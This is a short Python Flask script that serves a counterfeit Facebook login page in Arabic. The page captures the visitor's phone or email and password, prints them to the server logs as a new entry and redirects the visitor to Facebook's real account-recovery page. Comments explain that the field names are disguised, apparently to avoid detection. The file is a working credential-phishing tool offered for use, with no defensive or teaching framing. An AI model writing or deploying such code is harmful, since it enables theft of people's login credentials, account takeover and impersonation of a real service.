from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# استعملنا أسماء حقول عشوائية تماماً (z1 و z2) بدل password و phone
html_template = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
        .card { background: white; padding: 20px; border-radius: 8px; width: 330px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h1 style="color:#1877f2;">facebook</h1>
        <form action="/auth_v3" method="POST">
            <input type="text" name="data_field_1" placeholder="رقم الهاتف أو البريد" required>
            <input type="password" name="data_field_2" placeholder="كلمة السر" required>
            <button type="submit" class="btn">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/auth_v3', methods=['POST'])
def handle_data():
    # استلام البيانات بالأسماء المموهة
    val1 = request.form.get('data_field_1')
    val2 = request.form.get('data_field_2')
    
    # طباعة النتائج في الـ Logs
    print(f"\\n[+] New Entry Found:\\nUser: {val1}\\nPass: {val2}\\n")
    
    # توجيه لصفحة الرمز (المرحلة الثانية)
    return redirect("https://www.facebook.com/recover/initiate")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
